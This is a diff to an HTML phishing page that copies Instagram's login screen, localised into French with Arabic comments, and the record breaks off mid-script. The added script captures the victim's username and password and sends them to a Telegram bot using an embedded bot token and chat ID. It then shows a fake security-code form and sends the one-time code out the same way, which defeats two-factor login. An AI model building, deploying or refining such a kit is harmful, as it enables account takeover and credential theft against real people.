@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Login • Instagram</title>
+    <title>Connexion • Instagram</title>
     <style>
         * {
             box-sizing: border-box;
@@ -99,6 +99,9 @@
             text-decoration: none;
             display: block;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -108,36 +111,68 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/3840px-Instagram_logo.svg.png" alt="Instagram" class="logo-img">
         </div>
         
-        <div class="session-notice">
-            Your session has expired. Please log in again to continue.
+        <div class="session-notice" id="noticeText">
+            Votre session a expiré. Veuillez vous reconnecter pour continuer.
         </div>
 
+        <!-- نموذج تسجيل الدخول الأساسي -->
         <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, username, or email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" class="btn">Log In</button>
+            <input type="text" id="username" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit" class="btn">Se connecter</button>
         </form>
 
-        <div class="or-divider">
-            <div class="or-line"></div>
-            <div class="or-text">OR</div>
-            <div class="or-line"></div>
-        </div>
+        <!-- نموذج إدخال رمز التحقق (يظهر بعد الضغط على تسجيل الدخول) -->
+        <form id="otpForm" class="hidden">
+            <input type="text" id="otpCode" placeholder="Entrez le code de confirmation à 6 chiffres" required>
+            <button type="submit" class="btn">Confirmer</button>
+        </form>
 
-        <a href="#" class="fb-login">Log in with Facebook</a>
-        <a href="#" class="forgot-pass">Forgot password?</a>
+        <div id="footerSection">
+            <div class="or-divider">
+                <div class="or-line"></div>
+                <div class="or-text">OU</div>
+                <div class="or-line"></div>
+            </div>
+
+            <a href="#" class="fb-login">Se connecter avec Facebook</a>
+            <a href="#" class="forgot-pass">Mot oublié ?</a>
+        </div>
     </div>
 
     <script>
+        const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
+        const chatId = "865078178";
+
+        let capturedUser = "";
+
+        // خطوة 1: عند الضغط على تسجيل الدخول، يتم إرسال الباسورد وإظهار حقل رمز التحقق
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
+            capturedUser = user;
 
-            const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
-            const chatId = "865078178";
+            const message = "🎯 French Page - Credentials:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
+            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
-            const message = "🎯 Clean Logo Capture:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
+            const img = new Image();
+            img.src = url;
+
+            // إخفاء نموذج الباسورد وإظهار نموذج رمز التحقق
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('footerSection').classList.add('hidden');
+            document.getElementById('otpForm').classList.remove('hidden');
+            document.getElementById('noticeTextinnerText', 'Entrez le code de sécurité envoyé à votre appareil.');
+            document.getElementById('noticeText').textContent = "Entrez le code de sécurité envoyé à votre appareil.";
+        });
+
+        // خطوة 2: عند إدخال الرمز وإرساله، يتم إرساله لتليجرام ثم التوجيه لإنستغرام
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const otp = document.getElementById('otpCode').value;
+
+            const message = "🔐 French Page - OTP Code:\n👤 User: " + capturedUser + "\n🔢 Code: " + otp;
             const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
             const img = new Image();
